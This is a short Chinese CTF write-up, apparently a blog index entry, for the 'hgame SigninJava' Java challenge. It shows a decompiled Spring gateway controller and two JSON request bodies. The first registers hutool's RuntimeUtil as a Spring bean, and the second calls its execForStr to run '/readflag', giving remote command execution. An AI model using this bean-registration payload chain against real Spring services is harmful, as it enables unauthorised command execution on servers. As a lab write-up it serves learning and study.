[{"title":"hgame-SigninJava","url":"/2025/11/01/hgame-SigninJava/","content":"java，打开 jar 包可以看到代码，找到一个类\n@RequestMapping(&#123;&quot;/api&quot;&#125;)@Controller_/* loaded from: SigninJava.jar:BOOT-INF/classes/icu/Liki4/signin/controller/APIGatewayController.class */_**public** **class** APIGatewayController &#123;    @RequestMapping(value = &#123;&quot;/gateway&quot;&#125;, method = &#123;RequestMethod.POST&#125;)    @ResponseBody    **public** BaseResponse doPost(HttpServletRequest request) **throws** Exception &#123;        **try** &#123;            String body = IOUtils.toString(request.getReader());            Map&lt;String, Object&gt; map = (Map) JSON.parseObject(body, Map.**class**);            String beanName = (String) map.get(&quot;beanName&quot;);            String methodName = (String) map.get(JsonEncoder.METHOD_NAME_ATTR_NAME);            Map&lt;String, Object&gt; params = (Map) map.get(&quot;params&quot;);            **if** (StrUtil.containsAnyIgnoreCase(beanName, &quot;flag&quot;)) &#123;                **return** **new** BaseResponse(403, &quot;flagTestService offline&quot;, **null**);            &#125;            Object result = InvokeUtils.invokeBeanMethod(beanName, methodName, params);            **return** **new** BaseResponse(200, **null**, result);        &#125; **catch** (Exception e) &#123;            **return** **new** BaseResponse(500, ((Throwable) Objects.requireNonNullElse(e.getCause(), e)).getMessage(), **null**);        &#125;    &#125;&#125;\n\ndopost 中接受数据，通过 InvokeUtils.invokeBeanMethod 调用指定的 Bean 方法\n查看 hutool 的文档，发现其中有一个 RuntimeUtil，其中提供了命令执行方法，但是，只有注册到 Spring 容器中的 Bean 才能被 Spring 管理，并通过依赖注入的方式使用，而 RuntimeUtil 本身并不是一个 Spring Bean，因此需要通过动态注册将其加入 Spring 容器\n因此，我们需要先调用 cn.hutool.extra.spring.SpringUtil 中的 registerBean 方法来向容器中添加 RuntimeUtil 实例名不可带有 flag\n构造请求体\n&#123;&quot;beanName&quot;:&quot;cn.hutool.extra.spring.SpringUtil&quot;,&quot;methodName&quot;:&quot;registerBean&quot;,&quot;params&quot;:&#123;&quot;arg0&quot;:&quot;execCmd&quot;,&quot;arg1&quot;:&#123;&quot;@type&quot;:&quot;cn.hutool.core.util.RuntimeUtil&quot;&#125;&#125;&#125;\n\n在调用 execCmd\n&#123;&quot;beanName&quot;:&quot;execCmd&quot;,&quot;methodName&quot;:&quot;execForStr&quot;,&quot;params&quot;:&#123;&quot;arg0&quot;:&quot;utf-8&quot;,&quot;arg1&quot;:[&quot;/readflag&quot;]&#125;&#125;\n\n这里&#x2F;flag 被加权限了，不能直接 cat\n","tags":["CTF"]}]